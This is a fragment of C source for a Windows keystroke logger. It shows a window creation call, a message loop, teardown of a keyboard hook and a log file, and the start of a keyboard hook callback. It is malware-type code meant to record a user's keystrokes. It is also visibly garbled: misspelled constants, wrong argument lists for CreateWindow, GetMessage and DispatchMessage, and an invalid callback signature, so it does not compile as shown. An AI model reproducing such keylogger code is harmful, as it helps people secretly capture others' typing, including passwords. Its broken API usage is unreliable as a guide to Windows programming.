    HWND hwnd = CreateWindow("MyApp", "Keystroke Logger", WS_OVERLapped | WS_VISIBLE, 0, 0, 0, 0, 0, HWND_DESKTOP, 0, WS_HMENU, (long)hKeyboardHook);

    while (GetMessage(hwnd, 0)) {
        // Translate and dispatch the message
        TranslateMessage(&GetMessage(hwnd, 0));
        DispatchMessage(hwnd, messages);
    }

    // Uninstall the hook and clean up
    UnhookWindowsHook(hKeyboardHook);
    DestroyWindow(hwnd);
    fclose(logFile);
    return 0;
}

// Handle keyboard events
void CALLBACK keyboardHookProc(int event, HWND hwnd, KBDLLHOOKSTRUCT *kbt) {
